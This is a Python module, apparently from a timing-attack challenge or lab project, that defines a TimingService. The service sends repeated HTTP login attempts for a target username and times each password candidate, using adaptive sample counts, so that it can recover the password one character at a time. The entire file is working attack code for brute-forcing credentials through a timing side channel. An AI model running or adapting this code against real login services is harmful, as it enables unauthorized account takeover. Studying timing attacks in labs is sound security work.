"""
Timing measurement service with adaptive sampling.

Handles the collection of multiple timing measurements with
intelligent sample size adjustment.

Author: Your Name
Date: 2025
"""

from typing import List, Dict
from dataclasses import dataclass

from src.core.interfaces import IHttpClient, TimingMeasurement
from src.core.exceptions import InsufficientDataException
from src.utils.logger import Logger


@dataclass
class SamplingStrategy:
    """
    Configuration for adaptive sampling based on position.

    Early characters need more samples due to higher uncertainty.
    Later characters can use fewer samples as patterns emerge.
    """
    initial_samples: int = 20   # First 3 characters
    middle_samples: int = 15    # Characters 4-8
    final_samples: int = 10     # Characters 9+
    min_samples: int = 5        # Minimum required samples


class TimingService:
    """
    Service for collecting timing measurements with adaptive sampling.

    Responsibilities:
    - Collect multiple timing samples for reliability
    - Adapt sample size based on position
    - Filter failed measurements
    - Early stopping when correct password found

    Example:
        >>> service = TimingService(http_client, strategy)
        >>> measurements = service.measure_candidate("abc", "user", 1, position=0)
        >>> print(f"Collected {len(measurements)} valid samples")
    """

    def __init__(
        self,
        http_client: IHttpClient,
        sampling_strategy: SamplingStrategy,
        logger: Logger
    ):
        """
        Initialize timing service.

        Args:
            http_client: HTTP client for making requests
            sampling_strategy: Configuration for adaptive sampling
            logger: Logger instance
        """
        self.http_client = http_client
        self.strategy = sampling_strategy
        self.logger = logger

    def _get_sample_count(self, position: int) -> int:
        """
        Determine number of samples needed based on position.

        Early positions need more samples because:
        1. Higher uncertainty (no prior knowledge)
        2. Mistakes are costlier (compound errors)
        3. Timing differences might be smaller

        Args:
            position: Current character position (0-indexed)

        Returns:
            Number of samples to collect
        """
        if position < 3:
            return self.strategy.initial_samples
        elif position < 8:
            return self.strategy.middle_samples
        else:
            return self.strategy.final_samples

    def measure_candidate(
        self,
        password: str,
        username: str,
        difficulty: int,
        position: int
    ) -> List[TimingMeasurement]:
        """
        Collect multiple timing measurements for a password candidate.

        Features:
        - Adaptive sample size based on position
        - Filters out failed requests
        - Early stopping if correct password found
        - Validates minimum sample requirement

        Args:
            password: Password candidate to test
            username: Target username
            difficulty: Difficulty level
            position: Current position being tested (for adaptive sampling)

        Returns:
            List of successful timing measurements

        Raises:
            InsufficientDataException: If not enough valid samples collected
        """
        num_samples = self._get_sample_count(position)
        measurements: List[TimingMeasurement] = []

        self.logger.debug(
            f"Measuring '{password}' with {num_samples} samples "
            f"(position {position})"
        )

        for sample_num in range(num_samples):
            measurement = self.http_client.send_request(
                password, username, difficulty
            )

            # Early exit if we found the correct password
            if measurement.is_correct:
                self.logger.info(f"✓ Correct password found: {password}")
                return [measurement]

            # Only keep successful measurements
            if measurement.success:
                measurements.append(measurement)

        # Validate we have enough data
        if len(measurements) < self.strategy.min_samples:
            raise InsufficientDataException(
                samples_collected=len(measurements),
                samples_required=self.strategy.min_samples
            )

        self.logger.debug(
            f"Collected {len(measurements)}/{num_samples} valid samples"
        )

        return measurements

    def measure_all_candidates(
        self,
        current_password: str,
        charset: str,
        username: str,
        difficulty: int,
        position: int
    ) -> Dict[str, List[TimingMeasurement]]:
        """
        Measure timing for all possible next characters.

        Args:
            current_password: Password prefix discovered so far
            charset: String of possible characters (e.g., "abc...xyz")
            username: Target username
            difficulty: Difficulty level
            position: Current position being tested

        Returns:
            Dictionary mapping character -> list of measurements

        Example:
            >>> results = service.measure_all_candidates("ha", "abc", "user", 1, 2)
            >>> print(results.keys())
            dict_keys(['a', 'b', 'c'])
        """
        results: Dict[str, List[TimingMeasurement]] = {}

        self.logger.info(f"Testing position {position} ({len(charset)} candidates)")

        for char in charset:
            candidate = current_password + char

            try:
                measurements = self.measure_candidate(
                    candidate, username, difficulty, position
                )

                # Check if we found the complete password
                if measurements and measurements[0].is_correct:
                    self.logger.info(f"✓ Complete password found: {candidate}")
                    return {char: measurements}

                results[char] = measurements

            except InsufficientDataException as e:
                self.logger.warning(
                    f"Skipping '{char}': {e.samples_collected} samples "
                    f"(need {e.samples_required})"
                )
                # Use empty list for insufficient data
                results[char] = []

        return results